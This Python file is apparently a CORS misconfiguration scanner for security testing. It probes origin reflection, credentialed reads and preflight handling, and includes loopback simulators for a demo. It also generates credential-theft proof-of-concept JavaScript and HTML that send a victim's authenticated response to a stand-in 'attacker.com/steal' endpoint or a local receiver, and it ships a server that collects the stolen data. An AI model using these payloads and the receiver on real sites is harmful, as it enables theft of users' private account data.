#!/usr/bin/env python3
"""WEB9 — CORS Misconfiguration Scanner.

CORS header analysis, origin reflection testing, preflight abuse,
and credential-theft proof-of-concept using only standard-library modules.

Transport is stdlib urllib. `--demo` runs the full scan engine against a
built-in origin-reflecting CORS simulator (and a clean control) over loopback,
exercising the same HTTP code path as a live target.
"""

import json
import sys
import threading
import urllib.request
import urllib.parse
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional


def _norm_headers(headers) -> dict:
    """HTTP header keys are case-insensitive; normalize to lowercase."""
    return {k.lower(): v for k, v in headers.items()}


class CORSAnalyzer:
    """Analyze CORS headers on a target."""

    INTERESTING_HEADERS = [
        "access-control-allow-origin",
        "access-control-allow-methods",
        "access-control-allow-headers",
        "access-control-allow-credentials",
        "access-control-expose-headers",
        "access-control-max-age",
        "vary",
    ]

    def __init__(self, target_url: str, timeout: int = 10, verbose: bool = False):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.results = {}

    def _fetch(self, headers: Optional[dict] = None) -> tuple:
        """Make a request and return (status, response_headers, body)."""
        req = urllib.request.Request(self.target_url, method="GET")
        req.add_header("User-Agent", "Mozilla/5.0 (Security Scanner)")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        if self.verbose:
            print(f"      > GET {self.target_url}")
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            body = resp.read().decode("utf-8", errors="replace")
            resp_headers = _norm_headers(resp.headers)
            return resp.status, resp_headers, body
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            return e.code, _norm_headers(e.headers), body
        except Exception as e:
            return 0, {}, str(e)

    def get_cors_headers(self) -> dict:
        """Get base CORS headers."""
        status, headers, body = self._fetch()
        cors = {}
        for h in self.INTERESTING_HEADERS:
            if h in headers:
                cors[h] = headers[h]
        self.results["base_headers"] = cors
        self.results["base_status"] = status
        return cors

    def check_vulnerabilities(self) -> list:
        """Check for common CORS misconfigurations."""
        vulns = []
        cors = self.get_cors_headers()

        acao = cors.get("access-control-allow-origin", "")
        acac = cors.get("access-control-allow-credentials", "")

        if acao == "*":
            if acac.lower() == "true":
                vulns.append({
                    "type": "WILDCARD_WITH_CREDENTIALS",
                    "severity": "CRITICAL",
                    "detail": "Wildcard origin with credentials — browsers block this, but indicates misconfiguration",
                })
            else:
                vulns.append({
                    "type": "WILDCARD_ORIGIN",
                    "severity": "MEDIUM",
                    "detail": "Wildcard origin allows any site to read responses (no credentials)",
                })

        if acao == "null":
            vulns.append({
                "type": "NULL_ORIGIN",
                "severity": "HIGH",
                "detail": "Null origin accepted — exploitable via sandboxed iframe",
            })

        if acac.lower() == "true":
            vulns.append({
                "type": "CREDENTIALS_ENABLED",
                "severity": "INFO",
                "detail": "Credentials allowed — sensitive if origin is not properly validated",
            })

        vary_header = cors.get("vary", "")
        if "origin" not in vary_header.lower() and acao != "*":
            vulns.append({
                "type": "MISSING_VARY_ORIGIN",
                "severity": "MEDIUM",
                "detail": "Vary: Origin header missing — caching may leak CORS responses",
            })

        self.results["vulnerabilities"] = vulns
        return vulns


class CORSOriginReflector:
    """Test if the server reflects arbitrary origins."""

    def __init__(self, target_url: str, timeout: int = 10, verbose: bool = False):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.results = {}

    def _send_with_origin(self, origin: str) -> tuple:
        """Send request with custom Origin header."""
        req = urllib.request.Request(self.target_url, method="GET")
        req.add_header("Origin", origin)
        req.add_header("User-Agent", "Mozilla/5.0 (Security Scanner)")
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return resp.status, _norm_headers(resp.headers), resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, _norm_headers(e.headers), e.read().decode("utf-8", errors="replace")
        except Exception as e:
            return 0, {}, str(e)

    def test_origin_reflection(self) -> dict:
        """Test whether arbitrary origins are reflected."""
        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "https://localhost",
            "http://127.0.0.1",
            "https://subdomain.evil.com",
            "https://evil.com%0a.com",
            "https://evil.com%60.com",
        ]
        results = []
        for origin in test_origins:
            status, headers, body = self._send_with_origin(origin)
            acao = headers.get("access-control-allow-origin", "")
            acac = headers.get("access-control-allow-credentials", "")
            reflected = acao == origin
            if self.verbose and reflected:
                print(f"  [+] Origin reflected: {origin}")
            results.append({
                "origin": origin,
                "reflected": reflected,
                "acao": acao,
                "acac": acac,
                "status": status,
            })
        self.results["origin_reflection"] = results
        return results

    def test_preflight_reflection(self) -> list:
        """Test preflight (OPTIONS) origin reflection."""
        test_origins = ["https://evil.com", "null", "https://attacker.com"]
        results = []
        for origin in test_origins:
            req = urllib.request.Request(self.target_url, method="OPTIONS")
            req.add_header("Origin", origin)
            req.add_header("Access-Control-Request-Method", "GET")
            req.add_header("Access-Control-Request-Headers", "X-Custom-Header")
            try:
                resp = urllib.request.urlopen(req, timeout=self.timeout)
                headers = _norm_headers(resp.headers)
                acao = headers.get("access-control-allow-origin", "")
                results.append({
                    "origin": origin,
                    "preflight_accepted": acao == origin,
                    "acao": acao,
                    "ac_methods": headers.get("access-control-allow-methods", ""),
                    "ac_headers": headers.get("access-control-allow-headers", ""),
                })
            except urllib.error.HTTPError as e:
                headers = _norm_headers(e.headers)
                acao = headers.get("access-control-allow-origin", "")
                results.append({
                    "origin": origin,
                    "preflight_accepted": acao == origin,
                    "acao": acao,
                    "status_code": e.code,
                })
            except Exception as e:
                results.append({"origin": origin, "error": str(e)})
        self.results["preflight_reflection"] = results
        return results

    def full_scan(self) -> dict:
        """Run all origin reflection tests."""
        self.test_origin_reflection()
        self.test_preflight_reflection()
        return self.results


class CORSCredentialTester:
    """Test credential-related CORS behaviors."""

    def __init__(self, target_url: str, timeout: int = 10, verbose: bool = False):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.results = {}

    def _fetch(self, origin: str, credentials: bool = True) -> tuple:
        req = urllib.request.Request(self.target_url, method="GET")
        req.add_header("Origin", origin)
        if credentials:
            req.add_header("Cookie", "session=test_session_token_12345")
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return resp.status, _norm_headers(resp.headers), resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, _norm_headers(e.headers), e.read().decode("utf-8", errors="replace")
        except Exception as e:
            return 0, {}, str(e)

    def test_credentialed_requests(self) -> dict:
        """Test if cross-origin credentialed requests succeed."""
        origins = ["https://evil.com", "https://attacker.com", "null"]
        results = []
        for origin in origins:
            status_no_cred, _, _ = self._fetch(origin, credentials=False)
            status_cred, headers, _ = self._fetch(origin, credentials=True)
            acao = headers.get("access-control-allow-origin", "")
            acac = headers.get("access-control-allow-credentials", "")
            exploitable = (
                acao == origin
                and acac.lower() == "true"
            )
            if self.verbose and exploitable:
                print(f"  [+] Credentialed cross-origin read possible: {origin}")
            results.append({
                "origin": origin,
                "status_no_cred": status_no_cred,
                "status_cred": status_cred,
                "acao": acao,
                "acac": acac,
                "exploitable": exploitable,
            })
        self.results["credentialed"] = results
        return results

    def test_cookie_theft_scenario(self) -> dict:
        """Simulate cookie theft via CORS (PoC, does not send real cookies)."""
        evil_origins = ["https://evil.com", "https://attacker.com"]
        results = []
        for origin in evil_origins:
            status, headers, body = self._fetch(origin, credentials=True)
            acao = headers.get("access-control-allow-origin", "")
            acac = headers.get("access-control-allow-credentials", "")
            poc_script = (
                f"// PoC: Cookie theft via CORS misconfiguration\n"
                f"// Origin reflected: {acao == origin}\n"
                f"// Credentials allowed: {acac}\n"
                f"var xhr = new XMLHttpRequest();\n"
                f"xhr.open('GET', '{self.target_url}', true);\n"
                f"xhr.withCredentials = true;\n"
                f"xhr.onload = function() {{\n"
                f"    // Send stolen data to attacker\n"
                f"    fetch('https://attacker.com/steal?data=' + btoa(xhr.responseText));\n"
                f"}};\n"
                f"xhr.send();\n"
            )
            results.append({
                "origin": origin,
                "exploitable": acao == origin and acac.lower() == "true",
                "poc_js": poc_script,
                "acao": acao,
                "acac": acac,
            })
        self.results["cookie_theft"] = results
        return results

    def full_scan(self) -> dict:
        self.test_credentialed_requests()
        self.test_cookie_theft_scenario()
        return self.results


class CORSPreflightTester:
    """Test preflight (OPTIONS) request handling."""

    def __init__(self, target_url: str, timeout: int = 10, verbose: bool = False):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.results = {}

    def _preflight(self, origin: str, method: str = "DELETE",
                   headers: Optional[list] = None) -> tuple:
        req = urllib.request.Request(self.target_url, method="OPTIONS")
        req.add_header("Origin", origin)
        req.add_header("Access-Control-Request-Method", method)
        if headers:
            req.add_header("Access-Control-Request-Headers", ",".join(headers))
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return resp.status, _norm_headers(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, _norm_headers(e.headers)
        except Exception as e:
            return 0, {}

    def test_method_override(self) -> list:
        """Test if dangerous methods are allowed via preflight."""
        methods = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]
        results = []
        for method in methods:
            status, headers = self._preflight("https://evil.com", method=method)
            allowed = headers.get("access-control-allow-methods", "")
            acao = headers.get("access-control-allow-origin", "")
            results.append({
                "method": method,
                "allowed": method in allowed,
                "acao": acao,
                "allowed_methods": allowed,
                "status": status,
            })
        self.results["method_override"] = results
        return results

    def test_header_injection(self) -> list:
        """Test if custom headers are accepted in preflight."""
        custom_headers = [
            "X-Forwarded-For",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Custom-Header",
            "Authorization",
            "X-HTTP-Method-Override",
        ]
        results = []
        for header in custom_headers:
            status, headers = self._preflight(
                "https://evil.com", method="GET", headers=[header]
            )
            allowed = headers.get("access-control-allow-headers", "")
            results.append({
                "header": header,
                "allowed": header.lower() in allowed.lower(),
                "allowed_headers": allowed,
            })
        self.results["header_injection"] = results
        return results

    def full_scan(self) -> dict:
        self.test_method_override()
        self.test_header_injection()
        return self.results


# ---------------------------------------------------------------------------
# Built-in CORS simulators (importable so tests host them on loopback)
# ---------------------------------------------------------------------------

class VulnCORHandler(BaseHTTPRequestHandler):
    """Simulates a misconfigured API that reflects any Origin with credentials."""

    def _send(self, origin):
        if origin is None:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(
                b"<html><body><h1>Account</h1>"
                b"<p>email: lab@test.local</p></body></html>"
            )
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Access-Control-Allow-Origin", origin)
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.send_header("Vary", "Origin")
        self.end_headers()
        self.wfile.write(
            ("<html><body><h1>Account</h1>"
             "<p>email: lab@test.local</p></body></html>").encode()
        )

    def do_GET(self):
        origin = self.headers.get("Origin")
        self._send(origin)

    def do_OPTIONS(self):
        origin = self.headers.get("Origin")
        if origin is None:
            self.send_response(200)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", origin)
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.send_header("Access-Control-Allow-Methods",
                         "GET, POST, DELETE, PUT, PATCH, OPTIONS")
        self.send_header("Access-Control-Allow-Headers",
                         "Content-Type, Authorization, X-Custom-Header, X-Forwarded-For")
        self.send_header("Access-Control-Max-Age", "86400")
        self.end_headers()

    log_message = lambda self, fmt, *args: None  # noqa: E731


class CleanCORHandler(BaseHTTPRequestHandler):
    """Control server: returns no CORS headers regardless of Origin."""

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Account</h1></body></html>")

    def do_OPTIONS(self):
        self.send_response(204)
        self.end_headers()

    log_message = lambda self, fmt, *args: None  # noqa: E731


# ---------------------------------------------------------------------------
# Theft PoC receiver (for demonstration of the attack primitive)
# ---------------------------------------------------------------------------

class CORSTheftPoCServer:
    """Run a simple HTTP server to receive stolen data (for PoC demonstration)."""

    class Handler(BaseHTTPRequestHandler):
        stolen_data = []

        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            data = params.get("data", [""])[0]
            if data:
                CORSTheftPoCServer.Handler.stolen_data.append(data)
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"Data received")
            else:
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                html = (
                    "<html><body><h2>CORS Theft PoC Receiver</h2>"
                    "<p>Waiting for stolen data...</p>"
                    "<p>This server receives data exfiltrated via CORS misconfiguration.</p>"
                    "</body></html>"
                )
                self.wfile.write(html.encode())

        def do_OPTIONS(self):
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "*")
            self.end_headers()

        def log_message(self, format, *args):
            pass

    def __init__(self, port: int = 8899):
        self.port = port
        self.server = None

    def start(self):
        self.server = HTTPServer(("127.0.0.1", self.port), self.Handler)
        thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        thread.start()
        return self.port

    def stop(self):
        if self.server:
            self.server.shutdown()

    def get_stolen_data(self):
        return self.Handler.stolen_data

    def generate_poc_html(self, target_url: str) -> str:
        """Generate HTML page that exploits the CORS misconfiguration."""
        return (
            "<!DOCTYPE html>\n"
            "<html>\n<head><title>CORS Exploit PoC</title></head>\n"
            "<body>\n"
            "<h2>CORS Credential Theft PoC</h2>\n"
            "<p>This page demonstrates how a CORS misconfiguration can be exploited.\n"
            "When the victim visits this page while authenticated to the target,\n"
            "their data is silently exfiltrated.</p>\n"
            "<div id='result'></div>\n"
            "<script>\n"
            f"var target = '{target_url}';\n"
            f"var exfil = 'http://127.0.0.1:{self.port}/steal?data=';\n"
            "var xhr = new XMLHttpRequest();\n"
            "xhr.open('GET', target, true);\n"
            "xhr.withCredentials = true;\n"
            "xhr.onload = function() {\n"
            "    document.getElementById('result').innerText = 'Data stolen!';\n"
            "    fetch(exfil + btoa(xhr.responseText));\n"
            "};\n"
            "xhr.onerror = function() {\n"
            "    document.getElementById('result').innerText = 'Request blocked (expected in PoC).';\n"
            "};\n"
            "xhr.send();\n"
            "</script>\n"
            "</body></html>"
        )


class CORSScanner:
    """Complete CORS misconfiguration scanner orchestrator."""

    def __init__(self, target_url: str, timeout: int = 10, verbose: bool = False):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.all_results = {}

    def scan(self) -> dict:
        """Run all scans."""
        print(f"[1/4] Analyzing CORS headers...")
        analyzer = CORSAnalyzer(self.target_url, timeout=self.timeout,
                                verbose=self.verbose)
        self.all_results["headers"] = analyzer.get_cors_headers()
        self.all_results["vulns"] = analyzer.check_vulnerabilities()

        print(f"[2/4] Testing origin reflection...")
        reflector = CORSOriginReflector(self.target_url, timeout=self.timeout,
                                        verbose=self.verbose)
        self.all_results["origin_reflection"] = reflector.full_scan()

        print(f"[3/4] Testing credential handling...")
        cred_tester = CORSCredentialTester(self.target_url, timeout=self.timeout,
                                           verbose=self.verbose)
        self.all_results["credentials"] = cred_tester.full_scan()

        print(f"[4/4] Testing preflight handling...")
        preflight_tester = CORSPreflightTester(self.target_url, timeout=self.timeout,
                                               verbose=self.verbose)
        self.all_results["preflight"] = preflight_tester.full_scan()

        return self.all_results

    def count_vulnerabilities(self) -> int:
        """Count exploitable findings across all phases."""
        count = 0
        origins = self.all_results.get("origin_reflection", {}).get("origin_reflection", [])
        count += sum(1 for o in origins if o.get("reflected"))
        cred = self.all_results.get("credentials", {}).get("credentialed", [])
        count += sum(1 for c in cred if c.get("exploitable"))
        methods = self.all_results.get("preflight", {}).get("method_override", [])
        count += sum(1 for m in methods if m.get("allowed"))
        return count

    def generate_report(self) -> str:
        """Generate a formatted report."""
        report = []
        report.append("=" * 60)
        report.append(f"  CORS Misconfiguration Report: {self.target_url}")
        report.append("=" * 60)

        cors = self.all_results.get("headers", {})
        report.append("\n--- CORS Headers ---")
        if cors:
            for h, v in cors.items():
                report.append(f"  {h}: {v}")
        else:
            report.append("  No CORS headers found")

        vulns = self.all_results.get("vulns", [])
        report.append("\n--- Vulnerabilities ---")
        if vulns:
            for v in vulns:
                report.append(f"  [{v['severity']}] {v['type']}")
                report.append(f"    {v['detail']}")
        else:
            report.append("  No obvious misconfigurations detected")

        origins = self.all_results.get("origin_reflection", {}).get("origin_reflection", [])
        report.append("\n--- Origin Reflection ---")
        for o in origins:
            marker = "[VULN]" if o.get("reflected") else "[----]"
            report.append(f"  {marker}  origin={o['origin']}  acao={o.get('acao', '')}")

        cred = self.all_results.get("credentials", {}).get("credentialed", [])
        report.append("\n--- Credentialed Requests ---")
        for c in cred:
            marker = "[VULN]" if c.get("exploitable") else "[----]"
            report.append(
                f"  {marker}  origin={c['origin']}  acao={c.get('acao', '')}  "
                f"acac={c.get('acac', '')}"
            )

        methods = self.all_results.get("preflight", {}).get("method_override", [])
        report.append("\n--- Preflight Method Override ---")
        for m in methods:
            marker = "[VULN]" if m.get("allowed") else "[----]"
            report.append(
                f"  {marker}  method={m['method']}  allowed_in={m.get('allowed_methods', '')}"
            )

        report.append("\n" + "=" * 60)
        return "\n".join(report)


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------

def run_scan(handler_cls, label, verbose=False):
    """Run the full CORS engine against a built-in simulator over loopback."""
    server = HTTPServer(("127.0.0.1", 0), handler_cls)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    print(f"[*] DEMO MODE: CORS simulator ({label}) on http://127.0.0.1:{port}")
    print("[*] The engine sends Origin-bearing requests through urllib.\n")

    url = f"http://127.0.0.1:{port}/api/account"
    scanner = CORSScanner(url, timeout=5, verbose=verbose)
    results = scanner.scan()

    origins = results.get("origin_reflection", {}).get("origin_reflection", [])
    reflected = [o for o in origins if o.get("reflected")]
    cred = results.get("credentials", {}).get("credentialed", [])
    exploitable = [c for c in cred if c.get("exploitable")]
    preflights = results.get("origin_reflection", {}).get("preflight_reflection", [])
    preflight_accepted = [p for p in preflights if p.get("preflight_accepted")]

    server.shutdown()
    server.server_close()
    print()

    summary = {
        "origins_reflected": len(reflected),
        "credentialed_reads": len(exploitable),
        "preflights_accepted": len(preflight_accepted),
        "total": scanner.count_vulnerabilities(),
    }
    if reflected:
        sample = reflected[0]
        print(f"  [!] Origin reflected: {sample['origin']} -> ACAO: {sample['acao']} ACAC: {sample['acac']}")
    if exploitable:
        sample = exploitable[0]
        print(f"  [!] Credentialed cross-origin read: {sample['origin']} "
              f"(ACAO {sample['acao']} + ACAC {sample['acac']})")
    print(f"  [!] Origins reflected: {summary['origins_reflected']}; "
          f"credentialed reads: {summary['credentialed_reads']}; "
          f"preflights accepted: {summary['preflights_accepted']}")
    return server, scanner, summary


def run_demo(clean: bool = False, verbose: bool = False):
    """Offline demo: vulnerable (origin-reflecting) or clean control simulator."""
    if clean:
        _, _, summary = run_scan(CleanCORHandler, "CLEAN control (no CORS headers)", verbose)
        if summary["total"] == 0:
            print("\n[+] Demo: clean control produced zero CORS findings (no false positive).")
            print("[+] Exit 0 -- scanner works correctly.")
            return 0
        print("\n[-] Demo: false positive on clean control.")
        return 1

    server, scanner, summary = run_scan(VulnCORHandler, "VULNERABLE (reflects any Origin + credentials)", verbose)
    if summary["origins_reflected"] > 0 and summary["credentialed_reads"] > 0:
        print("\n[+] Demo: arbitrary-origin reflection AND credentialed cross-origin")
        print("[+] reads detected on vulnerable simulator (expected behavior).")
        print("[+] Exit 0 -- scanner works correctly.")
        return 0
    print("\n[-] Demo: unexpected result -- scanner may need tuning.")
    return 1


def demo():
    """Run both simulator demos in sequence."""
    rc = run_demo(clean=False)
    if rc == 0:
        print()
        rc = run_demo(clean=True)
    sys.exit(rc)


def main():
    """CLI entry point."""
    parser = argparse.ArgumentParser(
        description="WEB9 — CORS Misconfiguration Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 cors_scanner.py --url http://127.0.0.1:8080/api/data\n"
            "  python3 cors_scanner.py --url http://127.0.0.1:8080/api/data --poc\n"
            "  python3 cors_scanner.py --url http://127.0.0.1:8080/api/data --report\n"
            "  python3 cors_scanner.py --demo\n"
            "  python3 cors_scanner.py                    # equivalent to --demo\n"
        ),
    )
    parser.add_argument("--url", help="Target URL to scan")
    parser.add_argument("--timeout", type=int, default=10,
                        help="HTTP request timeout in seconds (default: 10)")
    parser.add_argument("--poc", action="store_true", help="Generate exploit PoC HTML")
    parser.add_argument("--server", action="store_true", help="Start PoC receiver server")
    parser.add_argument("--port", type=int, default=8899, help="Port for PoC server")
    parser.add_argument("--report", action="store_true", help="Print full report")
    parser.add_argument("--json-out", action="store_true", help="Dump results as JSON")
    parser.add_argument("--json", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose request logging and scan details")
    parser.add_argument("--demo", action="store_true",
                        help="Run offline demo against built-in vulnerable/clean simulators")
    args = parser.parse_args()

    if args.demo or not args.url:
        demo()
        return

    scanner = CORSScanner(args.url, timeout=args.timeout, verbose=args.verbose)
    results = scanner.scan()

    if args.report or args.json or args.json_out:
        if args.json or args.json_out:
            print(json.dumps(results, indent=2, default=str))
        else:
            print(scanner.generate_report())
    else:
        vulns = results.get("vulns", [])
        print(f"\nTarget: {args.url}")
        print(f"Vulnerabilities found: {len(vulns)}")
        for v in vulns:
            print(f"  [{v['severity']}] {v['type']}: {v['detail']}")
        origins = results.get("origin_reflection", {}).get("origin_reflection", [])
        for o in origins:
            marker = "[VULN]" if o.get("reflected") else "[----]"
            print(f"  {marker}  origin={o['origin']}  acao={o.get('acao','')}")
        print(f"  Total exploitable indicators: {scanner.count_vulnerabilities()}")

    if args.poc:
        poc_server = CORSTheftPoCServer(port=args.port)
        html = poc_server.generate_poc_html(args.url)
        poc_file = "cors_poc.html"
        with open(poc_file, "w") as f:
            f.write(html)
        print(f"\nPoC HTML written to {poc_file}")
        print(f"Open in browser while authenticated to test")

    if args.server:
        poc_server = CORSTheftPoCServer(port=args.port)
        port = poc_server.start()
        print(f"\nPoC receiver running on http://127.0.0.1:{port}")
        print("Press Ctrl+C to stop")
        try:
            threading.Event().wait()
        except KeyboardInterrupt:
            poc_server.stop()
            print("\nStopped.")


if __name__ == "__main__":
    import argparse
    main()